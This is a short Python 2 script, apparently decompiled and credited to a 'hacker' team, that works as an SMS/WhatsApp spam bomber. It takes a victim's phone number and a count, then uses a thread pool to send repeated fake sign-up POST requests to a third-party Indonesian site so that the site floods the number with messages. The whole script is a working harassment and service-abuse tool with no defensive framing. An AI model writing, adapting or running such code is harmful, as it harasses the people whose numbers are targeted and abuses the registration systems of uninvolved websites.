# Time Succses Parser : Tue Jun 16 13:03:13 2020
# Auto Parser Dis Version : 1.1.0
# Source : https://www.github.com/Datez-Kun

import requests, time
from multiprocessing.pool import ThreadPool
uag = {'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}
a = 0

def spam(msisdn):
    global a
    while True:
        try:
            b = requests.post('https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=', data={'namaDepan': 'bacot', 'emailNope': msisdn, 'password': 'anjirlu', 'konfirmasiPass': 'anjirlu'}, headers=uag)
            time.sleep(0.5)
            a -= -1
            print ('\r[{}] Spam Sended!').format(a)
            break
        except:
            pass


print 'Youtube : JustA Hacker'
print 'Github  : https://github.com/justahackers/spam_wa'
print 'Team    : Black coder crush'
no = raw_input('No (08) : ')
aa = []
for i in range(int(raw_input('Jumlah : '))):
    aa.append(no)

tp = ThreadPool(int(raw_input('Jumlah kecepatan (1-50) : ')))
tp.map(spam, aa)
# okay decompiling out.pyc
